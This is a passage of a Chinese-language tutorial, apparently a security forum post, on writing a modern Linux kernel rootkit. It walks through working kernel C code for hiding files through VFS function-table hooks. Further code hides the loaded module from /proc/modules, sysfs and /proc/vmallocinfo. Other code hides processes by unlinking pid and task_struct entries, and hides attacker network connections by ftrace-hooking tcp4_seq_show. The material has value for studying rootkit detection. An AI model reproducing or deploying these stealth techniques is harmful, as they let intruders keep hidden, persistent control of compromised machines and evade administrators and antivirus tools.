#elif defined(CONFIG_NORNIR_HIDE_FILE_HIJACK_GETDENTS_FTRACE)
    #ifndef CONFIG_DYNAMIC_FTRACE
        #error "Current kernel do not enable CONFIG_DYNAMIC_FTRACE"
    #endif
    return nornir_install_ftrace_filldir_hooks();
#else
    #error "No techniques were chosen for hooking filldir functions"
#endif
}
```

二、劫持对应文件系统的 VFS 函数表
-------------------

前面我们讲到用以遍历文件的系统调用都会调用到 `iterate_dir()` 函数，而 `iterate_dir()` 中实际上会调用对应文件的函数表中的 `iterate_shared` / `iterate` 函数，由此我们也可以 **通过 hook 对应文件系统函数表的** `iterate_shared` / `iterate` **函数来实现文件隐藏的功能**

> 同一文件系统间共用相同的函数表，由此对函数表的修改直接对整个文件系统生效，不过这里我们需要注意区分的是**数据文件和文件夹使用的不是同一个函数表**

由于填充返回给用户的数据的核心逻辑便是调用 `ctx->actor()` ，因此我们可以在我们自定义的 `iterate_shared` / `iterate` 中**直接动态修改 ctx->actor 函数指针**，从而完成文件隐藏：）

相比于 inline hook，直接 hook VFS 函数表要更方便得多，不过需要注意的是**函数表的地址对内核模块同样是不导出的**，这里我们有两种办法获得 VFS 函数表的地址：

*   借助用户态进程读取 /proc/kallsyms 进行获取
*   在内核空间中打开一个文件夹，直接修改其函数表

三、篡改 VFS 结构（针对仅存在于内存中的文件系统）
---------------------------

在 Linux 当中诸如 `ramfs/tmpfs/devtmpfs/procfs/sysfs/...` 等文件系统都并不在外存当中占用存储空间，没有对应的文件系统设备，而**仅存在于内存当中，为基于 VFS 与 page caches 结构形成基于内存的文件系统**

这类文件系统的文件函数表通常都是 `simple_dir_operations`，对于文件遍历而言其所用函数为 `dcache_readdir()`：

```
const struct file_operations simple_dir_operations = {
        .open                = dcache_dir_open,
        .release        = dcache_dir_close,
        .llseek                = dcache_dir_lseek,
        .read                = generic_read_dir,
        .iterate_shared        = dcache_readdir,
        .fsync                = noop_fsync,
};
EXPORT_SYMBOL(simple_dir_operations);
```

在 VFS 当中目录项（文件 / 文件夹）以 `dentry` 结构表示，其形成如下图所示拓扑结构，该函数的核心逻辑是**遍历 dentry->d_child 链表**：

![](https://s2.loli.net/2023/04/16/mO3bL8hSiVgRvok.png)

但是**打开文件使用的是不同的逻辑**，由此我们不难想到的是我们可以将要隐藏的文件的 `dentry` 结构体从对应的 `d_child` 链表中脱链，**从而在保持文件可用性的情况下完成文件隐藏**

0x04. 模块隐藏
==========

rootkit 想要在一台计算机上安稳地生存下来，便需要 _“隐藏自己，做好清理”_ ，本节将讲述如何将一个 LKM 进行初步的隐藏

> 实际上本章的大部分都可以通过常规的文件隐藏的方式来隐藏（这也是上古 rootkit 常用的做法），但是由于未修改内核数据结构的缘故使得这种方法**无法逃脱内核层面的反病毒查杀手段**，因此这里我们采用更加深入底层的修改方法 ：）

一、模块符号 & /proc/modules 隐藏
-------------------------

当我们的模块被装载进内核之后，其导出符号会变成内核公用符号表的一部分，**可以直接通过 /proc/kallsyms 进行查看**，同时我们可以通过 `/proc/modules` 查看到我们的 rootkit，因此我们需要对这两处地方进行隐藏，而这都需要基于同一个数据结构来完成：）

内核模块在内核当中被表示为一个 `module` 结构体，当我们使用 `insmod` 加载一个 LKM 时，实际上会调用到 `init_module()` 系统调用创建一个 `module` 结构体：

```
struct module {
        enum module_state state;
 
        /* Member of list of modules */
        struct list_head list;
        //...
```

多个 `module` 结构体之间组成一个双向链表，链表头部定义于 `kernel/module/main.c` 中：

```
LIST_HEAD(modules);
```

当我们使用 `lsmod` 显示已经装载的内核模块时，实际上会读取 `/proc/modules` 文件，而这**实际是通过注册了序列文件接口对 modules 链表进行遍历完成的**，同时**这套逻辑也被应用于 /proc/kallsyms** 上：

```
/* Called by the /proc file system to return a list of modules. */
static void *m_start(struct seq_file *m, loff_t *pos)
{
        mutex_lock(&module_mutex);
        return seq_list_start(&modules, *pos);
}
 
static void *m_next(struct seq_file *m, void *p, loff_t *pos)
{
        return seq_list_next(p, &modules, pos);
}
 
static void m_stop(struct seq_file *m, void *p)
{
        mutex_unlock(&module_mutex);
}
 
// m_show 就是获取模块信息，没啥好看的：）
 
static const struct seq_operations modules_op = {
        .start        = m_start,
        .next        = m_next,
        .stop        = m_stop,
        .show        = m_show
};
 
/*
* This also sets the "private" pointer to non-NULL if the
* kernel pointers should be hidden (so you can just test
* "m->private" to see if you should keep the values private).
*
* We use the same logic as for /proc/kallsyms.
*/
static int modules_open(struct inode *inode, struct file *file)
{
        int err = seq_open(file, &modules_op);
 
        if (!err) {
                struct seq_file *m = file->private_data;
 
                m->private = kallsyms_show_value(file->f_cred) ? NULL : (void *)8ul;
        }
 
        return err;
}
 
static const struct proc_ops modules_proc_ops = {
        .proc_flags        = PROC_ENTRY_PERMANENT,
        .proc_open        = modules_open,
        .proc_read        = seq_read,
        .proc_lseek        = seq_lseek,
        .proc_release        = seq_release,
};
 
static int __init proc_modules_init(void)
{
        proc_create("modules", 0, NULL, &modules_proc_ops);
        return 0;
}
module_init(proc_modules_init);
```

因此我们不难想到的是**我们可以通过将 rootkit 模块的 module 结构体从双向链表上脱链的方式完成模块隐藏**，我们可以通过 `THIS_MODULE` 宏获取对当前模块的 `module` 结构体的引用，从而有代码如下：

```
static void nornir_hide_mod_unlink_module(void)
{
    struct list_head *list;
 
    if (orig_module_mutex) {
        mutex_lock(orig_module_mutex);
    }
 
    list = &(THIS_MODULE->list);
    list_del(list);
 
    if (orig_module_mutex) {
        mutex_unlock(orig_module_mutex);
    }
}
```

二、/sys/module 隐藏
----------------

sysfs 是一个基于 ramfs 的文件系统，其作用是将内核的一些相关信息以文件的形式暴露给用户空间，**其中便包括内核模块的相关信息**，因此我们还需要完成 rootkit 在 sysfs 中的隐藏

Linux 设备驱动模型中比较核心的组成部分便是 `kobject` 与 `kset`，`kobject` 表示一个内核对象，通常**被嵌入到其他类型的结构当中**，多个 `kobject` 之间组织成层次结构：

```
struct kobject {
        const char                *name;
        struct list_head        entry;
        struct kobject                *parent;
        struct kset                *kset;
        //...
```

`kset` 是一种特殊的 kobject，表示**属于一个特定子系统的一组特定类型的 kobject**，用以整合一类 `kobject`：

```
struct kset {
        struct list_head list;
        spinlock_t list_lock;
        struct kobject kobj;
        const struct kset_uevent_ops *uevent_ops;
} __randomize_layout;
```

`kset` 与 `kobject` 间形成如下图所示层次结构， _属于同一 kset 的 kobject 可以有着不同的 ktype_ ：

![](https://s2.loli.net/2023/03/05/B5HxCE9u7vn3y2V.png)

这个模型更深入的实现不是我们所要关注的，我们更关注于如何在 sysfs 中隐藏我们的内核模块：）阅读源码不难发现各个内核模块的 `module` 结构体当中同样内嵌一个 kobject 结构体：

```
struct module_kobject {
        struct kobject kobj;
        //...
} __randomize_layout;
 
struct module {
 
        //...
 
        /* Sysfs stuff. */
        struct module_kobject mkobj;
 
        //...
```

`module` 结构体实际上也通过 kobject 组织为层次结构，归属于 `module_kset`：

```
struct kset *module_kset;
```

> 当我们 insmod 时会通过如下调用链将一个 module 结构体链入 sysfs 对应的 kobject 层次结构中，并创建相应的 `/sys/module/[模块名]` 目录：
> 
> ```
> sys_init_module()
> load_module()
>         mod_sysfs_setup()
>                 mod_sysfs_init() // 会检查重名模块
>                         kobject_init_and_add()
>                                 kobject_add_varg()
>                                             kobject_add_internal()
> ```

当我们读取 `/sys/module` 目录时内核会根据 `module_kset` 的层次结构动态生成各个模块的文件夹，因此我们需要将我们的模块从 `module_kset` 的层次结构中脱离，从而完成 sysfs 下的隐藏，这里我们可以直接使用内核提供的 `kobject_del()` 函数完成 kobject 的摘除：

```
static void nornir_hide_mod_unlink_kobject(void)
{
    if (orig_module_mutex) {
        mutex_lock(orig_module_mutex);
    }
 
    kobject_del(&(THIS_MODULE->mkobj.kobj));
 
    if (orig_module_mutex) {
        mutex_unlock(orig_module_mutex);
    }
}
```

三、/proc/vmallocinfo 隐藏
----------------------

内核模块的内存是通过 `vmap` 机制进行动态分配的，该机制用以分配**一块虚拟地址连续的内存**（物理地址不一定连续），主要原理是在[对应的虚拟地址空间](elink@ec4K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6W2L8r3W2^5K9i4u0Q4x3X3g2T1L8$3!0@1L8r3W2F1i4K6u0W2j5$3!0E0i4K6u0r3L8r3W2F1N6i4S2Q4x3V1k6D9j5i4c8W2M7%4c8Q4x3V1k6K6L8%4g2J5j5$3g2Q4x3V1k6p5L8$3y4#2L8h3g2F1N6r3q4@1K9h3!0F1i4K6u0r3P5o6R3$3i4K6u0r3P5o6R3$3i4K6g2X3y4U0c8Q4x3V1k6E0L8g2)9J5k6i4u0K6N6l9`.`.)中找到足够大的一块空闲区域，之后建立虚拟地址到物理页面的映射，对于内核模块而言为 `ffffffffa0000000~fffffffffeffffff` ：

```
ffffffffa0000000 |-1536    MB | fffffffffeffffff | 1520 MB | module mapping space
```

在内核当中所有**非连续映射的内核虚拟空间都有着一个对应的** `vmap_area` **结构体进行表示**，其中 `vmap_area` 结构在内核当中同时以**红黑树**（负责根据虚拟地址进行快速索引）与**链表**进行组织：

![](https://s2.loli.net/2023/04/17/ilY8Mzp7u49cHgo.png)

而通过读取 `/proc/vmallocinfo` 文件我们可以获取**所有通过 vmap 机制分配的内存信息，其中便包括我们的 rootkit 所占用的内存**：

![](https://s2.loli.net/2023/04/17/Ngt8MuC6VGhxdPl.png)

因此我们还需要**深入完成内存映射结构的隐藏**

首先还是按惯例阅读 `/proc/vmallocinfo` 的实现，类似于 `/proc/modules`，其同样使用了序列文件接口：

```
static const struct seq_operations vmalloc_op = {
        .start = s_start,
        .next = s_next,
        .stop = s_stop,
        .show = s_show,
};
 
static int __init proc_vmalloc_init(void)
{
        if (IS_ENABLED(CONFIG_NUMA))
                proc_create_seq_private("vmallocinfo", 0400, NULL,
                                &vmalloc_op,
                                nr_node_ids * sizeof(unsigned int), NULL);
        else
                proc_create_seq("vmallocinfo", 0400, NULL, &vmalloc_op);
        return 0;
}
module_init(proc_vmalloc_init);
```

注意到其**实际上是通过 vmap_area_list 完成遍历的**，因此我们只需要将模块内存对应的 `vmap_area` 从全局链表中摘除即可：

```
static void *s_next(struct seq_file *m, void *p, loff_t *pos)
{
        return seq_list_next(p, &vmap_area_list, pos);
}
 
//...
 
static int s_show(struct seq_file *m, void *p)
{
        struct vmap_area *va;
        struct vm_struct *v;
 
        va = list_entry(p, struct vmap_area, list);
    //...
```

下面笔者给出如下示例代码：

```
static void nornir_hide_mod_unlink_vma(void)
{
    struct vmap_area *va, *tmp_va;
    unsigned long mo_addr;
 
    mo_addr = (unsigned long) THIS_MODULE;
 
    list_for_each_entry_safe(va, tmp_va, _vmap_area_list, list) {
        if (mo_addr > va->va_start && mo_addr < va->va_end) {
            list_del(&va->list);
            rb_erase(&va->rb_node, vmap_area_root);
        }
    }
}
```

> 需要注意的是**摘除全局红黑树中的 vmap_area 节点意味着放弃了对相应虚拟地址空间的所有权，**这导致我们的 rootkit 的虚拟地址空间**可能被后面加载的新模块所覆盖**，使得我们的 rootkit 无法正常工作：(

四、模块依赖关系隐藏
----------

如果我们的 rootkit 依赖于其他的模块，则模块间依赖关系会被记录于 `sys/module/依赖模块/holder/` 中，因此我们也需要完成对模块依赖关系的隐藏

模块间依赖关系通过 `module_use` 结构体进行记录，本质上还是通过链表构建依赖关系：

```
/* modules using other modules: kdb wants to see this. */
struct module_use {
        struct list_head source_list;
        struct list_head target_list;
        struct module *source, *target;
};
```

因此我们只需要完成对应链表的脱链工作即可，下面笔者给出如下示例代码：

```
void nornir_hide_mod_unlink_use(void)
{
    struct module_use *use, *tmp;
 
    list_for_each_entry_safe(use, tmp, &THIS_MODULE->target_list, target_list) {
        list_del(&use->source_list);
        list_del(&use->target_list);
        sysfs_remove_link(use->target->holders_dir, THIS_MODULE->name);
    }
}
```

0x05. 进程隐藏
==========

有的时候我们需要启动一些恶意进程帮助我们完成一些任务，但是这些恶意进程很容易一个 `ls` 就被发现了 :（ 所以我们还需要完成隐藏进程的工作

一、pid 隐藏
--------

进程 id 在内核当中并非一个简单的整型字面量，而是一个 `pid` 结构体：

```
struct pid
{
        refcount_t count;
        unsigned int level;
        spinlock_t lock;
        /* lists of tasks that use this pid */
        struct hlist_head tasks[PIDTYPE_MAX];
        struct hlist_head inodes;
        /* wait queue for pidfd notifications */
        wait_queue_head_t wait_pidfd;
        struct rcu_head rcu;
        struct upid numbers[1];
};
```

> `inodes` 域似乎暂时没用：）

虽然所有的 `task_struct` 形成一个双向链表，但是遍历链表以找寻 pid 对应的 PCB 效率过低，因而有了基于 `pid` 结构体的索引，我们可以通过该结构体直接找到一个 pid 对应的 PCB，同时不同类型的进程（属于同一进程组 / 属于同一会话）也会通过 `task_struct->pid_links` 进行连接：

![](https://s2.loli.net/2023/03/08/RyzjPUSFZQpEWof.png)

一个进程在不同的 pid 命名空间内可能有着不同的 pid（其中子命名空间对父命名空间完全可见），内核通过 `upid` 结构体存储一个 `pid` 结构体在相应命名空间中的值，根据命名空间的父子层次结构存储在 `pid` 结构体中动态分配的 `upid` 数组中：

![](https://s2.loli.net/2023/03/08/TRxHWJKkVIvj9uA.png)

为了提高查找速度 ，`pid` 在内核中被组织成**基数树**（radix trie，对应 `idr` 结构体），当进行 `pid` 结构体查找时（`find_vpid()` ）实际上会先获取到当前进程的 pid 命名空间（`struct pid_namespace`）再进行基数树搜索

因此若是我们想要隐藏一个进程，使其无法被通过 pid 找到，只需要将其从对应的 pid 命名空间与所有上层 pid 命名空间中的基数树进行删除，并将 `task_struct` 从 `pid_links` 摘除即可

现笔者给出如下示例代码：

```
void nornir_hide_process_pid(struct task_struct *task, struct pid *pid)
{
    struct upid *upid;
 
    /* hide from pid's radix trie */
    for (int i = 0; i < pid->level; i++) {
        upid = pid->numbers + i;
        idr_remove(&upid->ns->idr, upid->nr);
    }
 
    /* hide from task_struct->pid_links */
    for (int i = 0; i < PIDTYPE_MAX; i++) {
        hlist_del_rcu(&task->pid_links[i]);
        INIT_HLIST_NODE(&task->pid_links[i]);
    }
}
```

> 需要注意的是删除链表后别忘了初始化链表节点，否则会 panic 掉
> 
> ![](https://s2.loli.net/2023/03/08/X4oVMp8kejhLBZW.png)

二、`task_struct` 链表隐藏
--------------------

在内核中一个进程使用 `task_struct` 表示，所有的 `task_struct` 构成一个双向链表，若是遍历该链表则很容易发现我们的恶意进程；此外，所有的 `task_struct` 按照进程亲子关系链接成树形结构，若是从 `init` 进程开始沿着这棵进行遍历的话仍然能够发现我们的恶意进程；以及还有 `thread_node` 和 `thread_group` 两个链表也可以让我们的恶意进程无处遁形 ：(

因此我们还需要完成将待隐藏进程从对应的链表中脱链的操作，现笔者给出如下示例代码：

```
void nornir_hide_process_task_struct(struct task_struct *task)
{
    /* set its parent to itself */
 
    task->parent = task;
    task->real_parent = task;
    task->group_leader = task;
 
    /* del from some link-list */
 
    list_del(&task->children);
    INIT_LIST_HEAD(&task->children);
 
    list_del(&task->sibling);
    INIT_LIST_HEAD(&task->sibling);
 
    list_del(&task->thread_node);
    INIT_LIST_HEAD(&task->thread_node);
 
    list_del(&task->thread_group);
    INIT_LIST_HEAD(&task->thread_group);
}
```

> 需要注意的是在删除链表之后别忘了初始化链表节点，否则会 panic：
> 
> ![](https://s2.loli.net/2023/03/08/S3DRw8vgN7aljWC.png)

Extra. 隐藏 procfs 文件
-------------------

诸如 `ps` 等查看进程的指令其实是通过读取 procfs 所提供的信息实现的，因此我们也可以**简单地**通过隐藏 procfs 中对应文件的方式来实现进程隐藏，直接使用前文的文件隐藏框架即可：）

**需要注意的是这种方法并不会改变内核中与进程关联的数据结构对象，因此我们的隐藏进程很容易被找出** :（

![](https://s2.loli.net/2023/04/16/NOjUm4VeZx2T3I1.png)

> 这种隐藏进程的方法其实非常古老了，因此笔者不推荐使用；相对应地古早时期有一种经典反病毒手段就是通过将每个进程都 kill 一遍的方式来找出隐藏进程 ：）

0x06. 网络连接隐藏
============

如果我们想要维持对目标计算机的远程控制，则我们需要与目标计算机之间建立相应的网络连接，异常的网络连接的存在很容易让我们入侵了这台计算机的这个事实被发现，因此我们还需要完成网络连接的隐藏

> 注：本节需要你对 Linux 网络协议栈有足够深入的了解：）

一、procfs 文件隐藏
-------------

Linux 下内核网络连接信息通常通过用户态的 `/proc/net` 接口导出，此类接口的信息导出实现依托于 [序列文件接口](elink@1fbK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6S2M7Y4c8@1L8X3u0S2x3#2)9J5k6h3y4F1i4K6u0r3x3U0l9J5y4q4)9J5c8U0l9#2i4K6u0r3x3K6q4Q4x3V1k6a6f1#2)9J5k6o6m8j5x3o6g2Q4x3X3c8x3d9f1&6g2h3q4)9J5k6p5E0q4f1V1&6q4e0q4)9J5k6p5k6u0e0p5g2e0h3g2y4f1c8f1#2Q4x3X3c8e0c8g2q4r3d9f1I4q4i4K6u0r3) ，对应关系如下表所示：

> 例如当我们使用 `netstat` 查看主机上的 TCP 连接时，实际上是读取了 `/proc/net/tcp` 文件的信息

<table><thead><tr><th>网络类型</th><th>对应 / proc</th><th>内核源码文件</th><th>主要实现函数</th></tr></thead><tbody><tr><td>TCP/IPv4</td><td>/proc/net/tcp</td><td>net/ipv4/tcp_ipv4.c</td><td>tcp4_seq_show</td></tr><tr><td>TCP/IPv6</td><td>/proc/net/tcp6</td><td>net/ipv6/tcp_ipv6.c</td><td>tcp6_seq_show</td></tr><tr><td>UDP/IPv4</td><td>/proc/net/udp</td><td>net/ipv4/udp.c</td><td>udp4_seq_show</td></tr><tr><td>UDP/IPv6</td><td>/proc/net/udp6</td><td>net/ipv6/udp.c</td><td>udp6_seq_show</td></tr></tbody></table>

因此我们不难想到的是我们只需要劫持对应的信息填充函数，在遇到我们想要隐藏的连接时不打印而是直接返回，我们便能完成对指定连接的隐藏：）

函数劫持的框架前面已经给出了，这里不再赘述，我们现在来看如何在内核当中一个网络连接大概长什么样子，以及我们在 `*_seq_show` 当中所获得的数据类型是什么样子

以 `tcp4_seq_show()` 为例，可以发现我们所获得的数据为一个 `struct sock` 类型：

```
static int tcp4_seq_show(struct seq_file *seq, void *v)
{
        struct tcp_iter_state *st;
        struct sock *sk = v;
```

套接字相关的基本概念这里不再赘述，简而言之在 Linux kernel 中使用 `struct socket` 来表示一个 **面向用户态** 的套接字（存放在 `file::private` ），`struct sock` 则用以在 **内核网络协议栈** 中表示一个套接字：

![](https://s2.loli.net/2024/12/17/gtOWaYFcRbUq6d2.png)

观察源码，注意到在 `tcp4_seq_show()` 当中会调用到 `get_tcp4_sock()` ，由此可知我们所获取到的 `struct sock` 实际上是被包含在更外层的结构当中的：

```
static void get_tcp4_sock(struct sock *sk, struct seq_file *f, int i)
{
        int timer_active;
        unsigned long timer_expires;
        const struct tcp_sock *tp = tcp_sk(sk);
        const struct inet_connection_sock *icsk = inet_csk(sk);
        const struct inet_sock *inet = inet_sk(sk);
```

这几个结构的包含关系如下：

```
struct inet_sock {
        /* sk and pinet6 has to be the first two members of inet_sock */
        struct sock                sk;
 
/* ... */
 
struct inet_connection_sock {
        /* inet_sock has to be the first member! */
        struct inet_sock          icsk_inet;
 
/* ... */
 
struct tcp_sock {
        /* Cacheline organization can be found documented in
         * Documentation/networking/net_cachelines/tcp_sock.rst.
         * Please update the document when adding new fields.
         */
 
        /* inet_connection_sock has to be the first member of tcp_sock */
        struct inet_connection_sock        inet_conn;
```

大致结构关系如下图所示：

![](https://s2.loli.net/2024/12/17/ApgsdSGfayznHbx.png)

更深层次的结构间联系及其含义我们就不关注了，对于网络连接的隐藏，我们更关注于套接字的地址所存放的位置，查看注释可以知道外部地址是存放在 `inet_sock::inet_daddr` 字段当中：

```
/** struct inet_sock - representation of INET sockets
*
* ...
* @inet_daddr - Foreign IPv4 addr
* ...
*/
struct inet_sock {
        /* ... */
#define inet_daddr                sk.__sk_common.skc_daddr
```

`inet_sock::inet_daddr` 实际上是一个四字节的 IPV4 地址，我们只需要直接对比其与我们想要隐藏的 IP 地址是否相同即可，这里我们给出一个简单的 ftrace 的例子：

```
static int nornir_exec_orig_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct inet_sock *inet;
    struct sock *sk;
    struct in_addr addr;
 
    if (unlikely(v == SEQ_START_TOKEN)) {
        return 1;
    }
 
    sk = v;
    inet = inet_sk(sk);
    addr.s_addr = inet->inet_daddr;
 
    if (unlikely(nornir_get_hidden_conn4_info(addr))) {
        return 0;
    }
 
    return 1;
}
 
static int nornir_tcp4_seq_show_placeholder(void)
{
    return 1;
}
 
static void
nornir_evil_tcp4_seq_show_ftrace(unsigned long ip, unsigned long parent_ip,
                            struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
#ifdef CONFIG_X86_64
    if (unlikely(!nornir_exec_orig_tcp4_seq_show(
        (void*) fregs->regs.di, (void*) fregs->regs.si
    ))) {
        fregs->regs.ip = (size_t) nornir_tcp4_seq_show_placeholder;
    }
#else
    #error "We do not support ftrace hook under current architecture yet"
#endif
}
```

0xFE. What's more...
====================

项目代码目前开源于 [https://github.com/arttnba3/Nornir-Rootkit](elink@459K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6S2M7Y4c8@1L8X3u0S2x3#2)9J5c8V1&6G2M7X3&6A6M7W2)9J5k6q4u0G2L8%4c8C8K9i4b7`.)，如果觉得写的还行的话还请多来点 star ？ ：）

0xFF.REFERENCE
==============

[【VIRUS.0x00】现代 Linux rootkit 开发导论](elink@301K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6S2M7Y4c8@1L8X3u0S2x3#2)9J5k6h3y4F1i4K6u0r3x3U0l9J5y4q4)9J5c8U0l9I4i4K6u0r3x3o6q4Q4x3V1k6h3d9g2u0g2f1#2)9J5k6o6m8j5x3o6m8Q4x3X3c8x3d9f1&6g2h3q4)9#2k6W2u0a6e0#2c8w2d9g2c8Q4x3V1j5`.)  
[现代 Linux rootkit 技术实现（1）](elink@f5bK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6^5P5W2)9J5k6h3q4D9K9i4W2#2L8W2)9J5k6h3y4G2L8g2)9J5c8Y4c8Q4x3V1j5I4x3U0b7K6z5b7`.`.)  
[【CODE.0x01】简易 Linux Rootkit 编写入门指北](elink@bc4K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6S2M7Y4c8@1L8X3u0S2x3#2)9J5k6h3y4F1i4K6u0r3x3U0l9J5x3g2)9J5c8U0l9%4i4K6u0r3x3o6N6Q4x3V1k6o6e0@1c8q4i4K6u0V1x3q4R3H3x3g2)9J5k6q4u0a6e0#2c8w2d9g2c8Q4x3V1j5`.)  
[简易 Linux Rootkit 编写入门指北（一）：模块隐藏与进程提权](elink@19eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2S2L8Y4q4#2j5h3&6C8k6g2)9J5k6h3y4G2L8g2)9J5c8Y4m8G2M7%4c8Q4x3V1k6A6k6q4)9J5c8U0t1@1y4U0M7@1z5b7`.`.)

[[注意] 看雪招聘，专注安全领域的专业人才平台！](https://job.kanxue.com/)

[#杂谈](forum-45-1-179.htm)